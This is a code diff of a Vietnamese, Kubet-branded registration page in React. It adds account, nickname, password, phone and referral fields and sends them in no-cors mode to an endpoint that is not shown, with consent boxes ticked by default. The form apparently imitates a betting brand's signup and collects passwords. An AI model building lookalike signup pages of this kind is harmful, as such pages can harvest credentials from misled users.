@@ -1,17 +1,35 @@
 import { useState } from 'react';
-import { Link } from 'react-router-dom';
 import { useSiteConfigContext } from '@/contexts/SiteConfigContext';
 
 export default function RegisterPage() {
   const { config } = useSiteConfigContext();
   const c = config.authRegister;
 
+  const [referralCode, setReferralCode] = useState('');
+  const [account, setAccount] = useState('');
+  const [accountError, setAccountError] = useState(false);
+  const [nickname, setNickname] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
   const [phone, setPhone] = useState('');
-  const [username, setUsername] = useState('');
+  const [checkbox1, setCheckbox1] = useState(true);
+  const [checkbox2, setCheckbox2] = useState(true);
   const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle');
+
+  const validateAccount = (value: string) => {
+    const valid = /^[a-zA-Z0-9]{4,10}$/.test(value);
+    setAccountError(value.length > 0 && !valid);
+  };
+
+  const handleAccountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    setAccount(value);
+    validateAccount(value);
+  };
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    if (accountError || !account || !password || !phone) return;
     setStatus('submitting');
 
     const formData = new FormData(e.currentTarget);
@@ -29,10 +47,12 @@ export default function RegisterPage() {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: params.toString(),
       });
-      // no-cors mode không đọc được response, nhưng request đã được gửi thành công
       setStatus('success');
+      setReferralCode('');
+      setAccount('');
+      setNickname('');
+      setPassword('');
       setPhone('');
-      setUsername('');
     } catch {
       setStatus('error');
     }
@@ -41,10 +61,7 @@ export default function RegisterPage() {
   return (
     <div className="min-h-screen flex flex-col" style={{ backgroundColor: c.bgColor }}>
       {/* Toolbar 1 */}
-      <div
-        className="w-full py-2.5 text-center text-xs font-medium tracking-wide"
-        style={{ backgroundColor: c.accentColor, color: '#ffffff' }}
-      >
+      <div className="w-full py-2 text-center text-xs font-medium tracking-wide" style={{ backgroundColor: c.accentColor, color: '#ffffff' }}>
         <div className="flex items-center justify-center gap-2 px-4">
           <span className="w-4 h-4 flex items-center justify-center">
             <i className="ri-football-line w-4 h-4 flex items-center justify-center" />
@@ -54,10 +71,7 @@ export default function RegisterPage() {
       </div>
 
       {/* Toolbar 2 */}
-      <div
-        className="w-full py-2 text-center text-xs font-medium tracking-wide"
-        style={{ backgroundColor: '#000000', color: '#ffffff' }}
-      >
+      <div className="w-full py-2 text-center text-xs font-medium tracking-wide" style={{ backgroundColor: '#000000', color: '#ffffff' }}>
         <div className="flex items-center justify-center gap-2 px-4">
           <span className="w-4 h-4 flex items-center justify-center">
             <i className="ri-trophy-line w-4 h-4 flex items-center justify-center text-yellow-400" />
@@ -67,122 +81,184 @@ export default function RegisterPage() {
       </div>
 
       {/* Main content */}
-      <div className="flex-1 flex items-center justify-center px-4 py-8">
-        <div className="w-full max-w-sm">
+      <div className="flex-1 flex items-start justify-center px-3 md:px-4 py-4 md:py-8">
+        <div className="w-full max-w-md">
           {/* Card */}
-          <div
-            className="rounded-xl p-6 md:p-8 border-2"
-            style={{
-              backgroundColor: c.cardBg,
-              borderColor: c.borderColor,
-            }}
-          >
-            <div className="text-center mb-6">
-              <img
-                src={c.authLogo}
-                alt="Kubet Logo"
-                className="mx-auto mb-4 object-contain"
-                style={{ width: c.authLogoWidth, height: c.authLogoHeight }}
-              />
-              <h1 className="text-xl font-semibold text-gray-900">{c.title}</h1>
-              <p className="text-sm text-gray-500 mt-1">{c.subtitle}</p>
+          <div className="rounded-lg border overflow-hidden" style={{ backgroundColor: c.cardBg, borderColor: '#e5e5e5' }}>
+            {/* Header */}
+            <div className="px-3 md:px-4 py-3 border-b flex items-center justify-center relative" style={{ borderColor: '#e5e5e5' }}>
+              <h1 className="text-sm md:text-base font-bold tracking-wider" style={{ color: '#2196f3' }}>
+                {c.title}
+              </h1>
+              <button
+                type="button"
+                className="absolute right-3 w-7 h-7 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer"
+                onClick={() => window.history.back()}
+              >
+                <i className="ri-close-line text-xl w-5 h-5 flex items-center justify-center" />
+              </button>
             </div>
 
-            <form id="dang-ky-kubet" onSubmit={handleSubmit} className="space-y-4">
-              <div>
-                <label htmlFor="reg-phone" className="block text-sm font-medium text-gray-700 mb-1">
-                  {c.phoneLabel}
-                </label>
+            <form onSubmit={handleSubmit} className="p-3 md:p-4 space-y-2.5 md:space-y-3">
+              {/* Mã giới thiệu — mobile: label above input; desktop: side by side */}
+              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
+                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.referralCodeLabel}</label>
                 <input
-                  id="reg-phone"
+                  name="referralCode"
+                  type="text"
+                  value={referralCode}
+                  onChange={(e) => setReferralCode(e.target.value)}
+                  placeholder={c.referralCodePlaceholder}
+                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
+                  style={{ backgroundColor: '#f0f0f0', borderColor: '#e5e5e5' }}
+                />
+              </div>
+
+              {/* Tài khoản */}
+              <div className="flex flex-col md:flex-row md:items-start gap-1 md:gap-3">
+                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right md:pt-2">{c.accountLabel}</label>
+                <div className="flex-1">
+                  <input
+                    name="account"
+                    type="text"
+                    value={account}
+                    onChange={handleAccountChange}
+                    placeholder={c.accountPlaceholder}
+                    required
+                    className="w-full px-3 py-2 text-sm rounded-sm border focus:outline-none"
+                    style={{ backgroundColor: '#f0f0f0', borderColor: '#e5e5e5' }}
+                  />
+                  {accountError && (
+                    <p className="text-xs text-red-500 mt-1">{c.accountValidationText}</p>
+                  )}
+                </div>
+              </div>
+
+              {/* Biệt danh */}
+              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
+                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.nicknameLabel}</label>
+                <input
+                  name="nickname"
+                  type="text"
+                  value={nickname}
+                  onChange={(e) => setNickname(e.target.value)}
+                  placeholder={c.nicknamePlaceholder}
+                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
+                  style={{ backgroundColor: '#f0f0f0', borderColor: '#e5e5e5' }}
+                />
+              </div>
+
+              {/* Mật khẩu */}
+              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
+                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.passwordLabel}</label>
+                <div className="flex-1 relative">
+                  <input
+                    name="password"
+                    type={showPassword ? 'text' : 'password'}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder={c.passwordPlaceholder}
+                    required
+                    className="w-full px-3 py-2 pr-10 text-sm rounded-sm border focus:outline-none"
+                    style={{ backgroundColor: '#f0f0f0', borderColor: '#e5e5e5' }}
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute right-2 top-1/2 -translate-y-1/2 w-6 h-6 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer"
+                  >
+                    <i className={`${showPassword ? 'ri-eye-off-line' : 'ri-eye-line'} w-5 h-5 flex items-center justify-center`} />
+                  </button>
+                </div>
+              </div>
+
+              <hr className="border-gray-200 my-1" />
+
+              {/* SĐT — không có nút gửi mã */}
+              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
+                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.phoneLabel}</label>
+                <input
                   name="phone"
                   type="tel"
-                  required
                   value={phone}
                   onChange={(e) => setPhone(e.target.value)}
-                  placeholder="0909 123 456"
-                  className="w-full px-3 py-2.5 border border-gray-200 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-gray-200 focus:border-gray-300 transition-all"
-                />
-              </div>
-
-              <div>
-                <label htmlFor="reg-username" className="block text-sm font-medium text-gray-700 mb-1">
-                  {c.usernameLabel}
-                </label>
-                <input
-                  id="reg-username"
-                  name="username"
-                  type="text"
+                  placeholder={c.otpPlaceholder}
                   required
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  placeholder="Tên đăng ký của bạn"
-                  className="w-full px-3 py-2.5 border border-gray-200 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-gray-200 focus:border-gray-300 transition-all"
+                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
+                  style={{ backgroundColor: '#f0f0f0', borderColor: '#e5e5e5' }}
                 />
               </div>
 
+              <hr className="border-gray-200 my-1" />
+
+              {/* Checkbox 1 */}
+              <div className="flex items-start gap-2">
+                <button
+                  type="button"
+                  onClick={() => setCheckbox1(!checkbox1)}
+                  className="w-5 h-5 flex-shrink-0 flex items-center justify-center border rounded-sm mt-0.5 cursor-pointer"
+                  style={{
+                    borderColor: '#4caf50',
+                    backgroundColor: checkbox1 ? '#4caf50' : '#fff',
+                  }}
+                >
+                  {checkbox1 && <i className="ri-check-line text-white w-4 h-4 flex items-center justify-center" />}
+                </button>
+                <span className="text-xs md:text-sm text-gray-700 leading-relaxed">{c.checkbox1Label}</span>
+              </div>
+
+              {/* Checkbox 2 */}
+              <div className="flex items-start gap-2">
+                <button
+                  type="button"
+                  onClick={() => setCheckbox2(!checkbox2)}
+                  className="w-5 h-5 flex-shrink-0 flex items-center justify-center border rounded-sm mt-0.5 cursor-pointer"
+                  style={{
+                    borderColor: '#4caf50',
+                    backgroundColor: checkbox2 ? '#4caf50' : '#fff',
+                  }}
+                >
+                  {checkbox2 && <i className="ri-check-line text-white w-4 h-4 flex items-center justify-center" />}
+                </button>
+                <span className="text-xs md:text-sm text-gray-700 leading-relaxed">
+                  {c.checkbox2Label}{' '}
+                  <a href={c.termsUrl} target="_blank" rel="noopener noreferrer" className="underline" style={{ color: '#2196f3' }}>
+                    {c.termsLinkText}
+                  </a>
+                </span>
+              </div>
+
+              {/* Submit button */}
               <button
                 type="submit"
                 disabled={status === 'submitting'}
-                className="w-full text-white text-sm font-bold py-3 rounded-md transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer whitespace-nowrap hover:brightness-110"
-                style={{ backgroundColor: c.accentColor }}
+                className="w-full text-white text-sm font-medium py-3 rounded-sm transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer whitespace-nowrap"
+                style={{ backgroundColor: '#9e9e9e' }}
               >
                 {status === 'submitting' ? (
                   <span className="inline-flex items-center gap-2">
-                    <span className="w-4 h-4 flex items-center justify-center">
-                      <i className="ri-loader-4-line animate-spin w-4 h-4 flex items-center justify-center" />
-                    </span>
+                    <i className="ri-loader-4-line animate-spin w-4 h-4 flex items-center justify-center" />
                     Đang xử lý...
                   </span>
                 ) : (
-                  c.buttonText
+                  c.confirmButtonText
                 )}
               </button>
             </form>
 
             {status === 'success' && (
-              <div className="mt-4 p-3 bg-green-50 border border-green-200 rounded-md text-sm text-green-700 flex items-start gap-2">
-                <span className="mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0">
-                  <i className="ri-checkbox-circle-line w-4 h-4 flex items-center justify-center" />
-                </span>
+              <div className="mx-3 md:mx-4 mb-3 md:mb-4 p-3 bg-green-50 border border-green-200 rounded-sm text-sm text-green-700 flex items-start gap-2">
+                <i className="ri-checkbox-circle-line mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0" />
                 {c.successMessage}
               </div>
             )}
 
             {status === 'error' && (
-              <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-sm text-red-700 flex items-start gap-2">
-                <span className="mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0">
-                  <i className="ri-error-warning-line w-4 h-4 flex items-center justify-center" />
-                </span>
+              <div className="mx-3 md:mx-4 mb-3 md:mb-4 p-3 bg-red-50 border border-red-200 rounded-sm text-sm text-red-700 flex items-start gap-2">
+                <i className="ri-error-warning-line mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0" />
                 {c.errorMessage}
               </div>
             )}
-
-            <div className="mt-6 text-center">
-              <p className="text-sm text-gray-500">
-                Đã có tài khoản?{' '}
-                <Link
-                  to="/dang-nhap"
-                  className="font-semibold hover:underline"
-                  style={{ color: c.accentColor }}
-                >
-                  Đăng nhập
-                </Link>
-              </p>
-            </div>
-          </div>
-
-          {/* Back to home */}
-          <div className="mt-6 text-center">
-            <Link
-              to="/"
-              className="inline-flex items-center gap-2 text-sm text-gray-400 hover:text-gray-200 transition-colors"
-            >
-              <span className="w-4 h-4 flex items-center justify-center">
-                <i className="ri-arrow-left-line w-4 h-4 flex items-center justify-center" />
-              </span>
-              Quay lại trang chủ
-            </Link>
           </div>
         </div>
       </div>
